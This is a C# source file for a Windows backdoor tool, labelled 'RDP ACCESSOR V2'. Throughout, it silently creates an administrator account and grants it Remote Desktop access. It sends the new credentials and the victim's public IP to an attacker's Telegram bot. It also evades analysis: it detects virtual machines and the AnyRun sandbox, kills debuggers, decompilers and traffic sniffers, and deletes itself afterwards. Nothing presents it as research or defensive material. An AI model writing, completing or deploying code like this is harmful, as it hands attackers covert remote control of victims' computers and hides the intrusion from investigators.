using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;

namespace localhost
{
    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            CheckAnalysis(); // Check AnyRun or Virtual Machine 
            CheckProcesses(); // Check forbidden processes: debuggers, network monitors and etc. . .

            try
            {
                createAdminUser(); // Create admin user
                allowRemoteAccess(); // Allowed remote accesses
                SendMessage("Job's done!"); // null function
                autoSeflDel(); // auto-self delete function
            }
            catch 
            {
                autoSeflDel(); // Autoself delete
                return;
            }


        }
        private static void createAdminUser()
        {
            try
            {
                AppendToSummary("Created Admin User");
                RunPS($"net user {newUserName} {newUserPass} /add");
                RunPS($"net localgroup administrators {newUserName} /add");
            }
            catch (Exception)
            {
                throw;
            }
        }
        private static void allowRemoteAccess()
        {
            try
            {
                AppendToSummary("Allowed Remote Access");
                RunPS($"net localgroup \"Remote Desktop Users\" {newUserName} /add");
            }
            catch (Exception)
            {
                throw;
            }
        }

        private static void AppendToSummary(string text)
        {
            summaryMessage = summaryMessage + text + Environment.NewLine;
        }

        private static void SendMessage(string text)
        {
            try
            {
                string ram = GetRAM();
                string value = string.Concat(new string[]
                {
                    string.Concat(new string[]
                    {
                        "===[ ]===[ RDP ACCESSOR V2 LOG ]===[ ]===",
                        Environment.NewLine,
                        summaryMessage,
                        "[+]  Username => ",
                        newUserName,
                        "\n[+]  Password => ",
                        newUserPass,
                        "\n[+]  IP => ",
                        Get("https://api.ipify.org/"),
                        "\n[+]  RAM => ", ram,
                        "\n[+]  Result => ",text,
                        "\n===[ ]===[ NEW ADMIN-USER LOG ]===[ ]==="
                    })
                });
                using (WebClient webClient = new WebClient())
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    webClient.DownloadString(string.Concat(new string[]
                    {
                        "https://api.telegram.org/bot",
                        Program.Token,
                        "/sendMessage?chat_id=",
                        Program.ID,
                        "&text=",
                        WebUtility.UrlEncode(value)
                    }));
                }
            }
            catch (Exception)
            {
                throw;
            }
        }

        private static void CheckAnalysis()
        {
            if (AntiVM_Checker())
            {
                autoSeflDel();
            }

            if (AnyRunDtc())
            {
                autoSeflDel();
            }
        }

        // CHECK FORBIDDEN PROCESSES AND CHECKING VIRTUAL MACHINES OR ANYRUN | START
        public static bool CheckProcesses() // Check Forbidden processes to kill
        {
            string[] forbiddenProcesses = {
                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
            };
            var processes = Process.GetProcesses();

            foreach (var processName in forbiddenProcesses)
            {
                foreach (var process in processes)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        try
                        {
                            process.Kill();
                            process.Dispose();
                        }
                        catch { }


                        return true;
                    }
                }
            }

            return false;
        } // End function

        private static bool AnyRunDtc() // Check AnyRun
        {
            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };

            foreach (string fileName in array)
            {
                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                {
                    return false; 
                }
            }

            if (string.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
            {
                return true;
            }

            return false;
        } // End function

        private static bool AntiVM_Checker() // Check Virtual Machine
        {
            string[] vmProcesses = {
        "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
        "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
        "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxsService",
        "VBoxsTray",
    };

            var processes = Process.GetProcesses();

            foreach (var process in processes)
            {
                foreach (var processName in vmProcesses)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        return true;
                    }
                }
            }

            return false;
        } // End Function

    // END CHECKING
        

        private static void RunPS(string args)
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
            process.WaitForExit();
        }

        private static string GetRAM()
        {
            try
            {
                int num = 0;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
                    {
                        if (enumerator.MoveNext())
                        {
                            ManagementObject managementObject = (ManagementObject)enumerator.Current;
                            double num2 = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
                            num = (int)(num2 / 1048576.0) - 1;
                        }
                    }
                }
                return num.ToString("#,GB");
            }
            catch (Exception)
            {
                throw;
            }
        }

        private static string Get(string uri)
        {
            using (WebClient client = new WebClient())
            {
                string result = client.DownloadString(uri);
                return result;
            }
            
        }


        private static void autoSeflDel()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            selfRemove(fileName, 1);
            Environment.Exit(0);
        }


        private static void selfRemove(string fileName, int delaySecond = 2)
        {
            fileName = Path.GetFullPath(fileName);
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";

            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
        }

        public static string Token = "TOKENBOT";
        public static string ID = "CHATIDUSER";
        public static string newUserName = "RDPUSERNAME";
        public static string newUserPass = "RDPPASSWORD";
        public static string summaryMessage = "";
    }
}
